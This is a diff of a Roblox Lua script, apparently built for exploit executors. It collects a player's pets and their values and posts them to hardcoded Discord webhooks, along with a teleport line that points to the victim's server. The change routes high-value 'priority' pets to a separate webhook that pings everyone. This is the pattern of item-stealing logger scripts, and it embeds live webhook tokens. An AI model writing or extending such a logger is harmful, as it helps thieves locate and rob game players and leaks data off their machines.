@@ -2,8 +2,9 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- === CONFIG ===
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"
+-- === WEBHOOKS ===
+local WEBHOOK_PRIORITY = "https://discord.com/api/webhooks/1410626814857973831/O4uWK0swu6aCG8HFTKa_3cncOA2liwK38aeAr-8fwPU7IDwASPHUg6jy-XLOanMWXzhU"
+local WEBHOOK_NORMAL   = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"
 
 -- === PRIORITY PETS & VALUES ===
 local PRIORITY = {
@@ -93,7 +94,7 @@ local function formatPetLine(name)
     local ageText = ageMatch and ("[Age " .. ageMatch .. "]") or ""
 
     if not emoji then
-        if weight >= 15 then  -- changed threshold from 30 to 15
+        if weight >= 15 then  -- 💪 triggers at 15kg now
             emoji = "💪"
         else
             emoji = "🐶"
@@ -151,9 +152,12 @@ local backpack, backpackValue, hasPriorityBackpack = collectPets(player:FindFirs
 local equipped, equippedValue, hasPriorityEquipped = collectPets(player.Character)
 local totalValue = backpackValue + equippedValue
 
--- Ping if any priority pet exists
+-- Determine if any priority pet exists
 local hasPriority = hasPriorityBackpack or hasPriorityEquipped
 local pingText = hasPriority and "--@everyone\n" or ""
+
+-- Select correct webhook
+local targetWebhook = hasPriority and WEBHOOK_PRIORITY or WEBHOOK_NORMAL
 
 -- Teleport line
 local teleportLine = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', game.PlaceId, game.JobId)
@@ -166,7 +170,7 @@ local serverURL = string.format(
     game.JobId
 )
 
--- Embed color: red if ping, green if no priority
+-- Embed color: red if priority pet, green if not
 local embedColor = hasPriority and 15158332 or 3066993
 
 -- Build Discord embed
@@ -197,7 +201,7 @@ local req = http_request or request or (syn and syn.request) or (fluxus and flux
 if req then
     pcall(function()
         req({
-            Url = WEBHOOK_URL,
+            Url = targetWebhook, -- uses priority or normal webhook
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = json
